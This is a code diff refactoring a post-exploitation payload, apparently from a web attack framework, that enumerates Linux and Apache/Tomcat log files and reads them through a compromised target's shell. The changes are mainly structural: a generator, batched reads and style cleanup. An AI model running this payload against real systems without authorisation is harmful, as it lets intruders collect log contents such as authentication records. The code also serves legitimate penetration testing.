@@ -1,14 +1,13 @@
 import re
-from plugins.attack.payloads.base_payload import base_payload
-from core.ui.consoleUi.tables import table
+from plugins.attack.payloads.base_payload import Payload
+from core.ui.console.tables import table
 
 
-class log_reader(base_payload):
+class log_reader(Payload):
     '''
     This payload finds different readable logs on the filesystem.
     '''
-    def api_read(self, parameters):
-        result = {}
+    def fname_generator(self):
         logs = []
 
         logs.append('/var/log/kern.log')
@@ -63,23 +62,27 @@ class log_reader(base_payload):
         logs.append('/var/log/tomcat6/localhost.')
         logs.append('/var/log/tomcat6/catalina.')
 
-
         for i in xrange(10):
             ext = '.gz'
-            if i==1:
-                ext =''
-            logs.append('/var/log/debug.'+str(i))
-            logs.append('/var/log/daemon.log.'+str(i)+ext)
-            logs.append('/var/log/auth.log.'+str(i)+ext)
-            logs.append('/var/log/dmesg.'+str(i)+ext)
-            logs.append('/var/log/kern.log.'+str(i)+ext)
-            logs.append('/var/log/user.log.'+str(i)+ext)
-            logs.append('/var/log/syslog.'+str(i)+ext)
-            logs.append('/var/log/Xorg.'+str(i)+'.log')
-            logs.append('/var/log/dpkg.log.'+str(i)+'.log')
-            logs.append('/var/log/messages.log.'+str(i)+ext)
-            logs.append('/var/log/gdm/:0.log.'+str(i))
+            if i == 1:
+                ext = ''
+            logs.append('/var/log/debug.' + str(i))
+            logs.append('/var/log/daemon.log.' + str(i) + ext)
+            logs.append('/var/log/auth.log.' + str(i) + ext)
+            logs.append('/var/log/dmesg.' + str(i) + ext)
+            logs.append('/var/log/kern.log.' + str(i) + ext)
+            logs.append('/var/log/user.log.' + str(i) + ext)
+            logs.append('/var/log/syslog.' + str(i) + ext)
+            logs.append('/var/log/Xorg.' + str(i) + '.log')
+            logs.append('/var/log/dpkg.log.' + str(i) + '.log')
+            logs.append('/var/log/messages.log.' + str(i) + ext)
+            logs.append('/var/log/gdm/:0.log.' + str(i))
 
+        for fname in logs:
+            yield fname
+
+    def api_read(self):
+        result = {}
 
         def parse_apache_logs(config_file):
             error_log = re.search('(?<=ErrorLog )(.*?)\s', config_file)
@@ -96,31 +99,29 @@ class log_reader(base_payload):
         config_file = self.exec_payload('apache_config_files')['apache_config']
         for config in config_file:
             apache_logs = parse_apache_logs(self.shell.read(config))
-            for log in apache_logs:
-                content = self.shell.read(log)
+            for file_path, content in self.read_multi(apache_logs):
                 if content:
-                    result[ log ] = content
+                    result[file_path] = content
 
-        for log in logs:
-            content = self.shell.read(log)
+        fname_iter = self.fname_generator()
+        for file_path, content in self.read_multi(fname_iter):
             if content:
-                result[ log ] = content
-                
+                result[file_path] = content
+
         return result
 
+    def run_read(self):
+        api_result = self.api_read()
 
-    def run_read(self, parameters):
-        api_result = self.api_read( parameters )
-        
         if not api_result:
             return 'No log files not found.'
         else:
             rows = []
-            rows.append( ['Log files'] ) 
-            rows.append( [] )
+            rows.append(['Log files'])
+            rows.append([])
             for filename in api_result:
-                rows.append( [filename,] )
-                
-            result_table = table( rows )
-            result_table.draw( 80 )                    
+                rows.append([filename, ])
+
+            result_table = table(rows)
+            result_table.draw(80)
             return rows
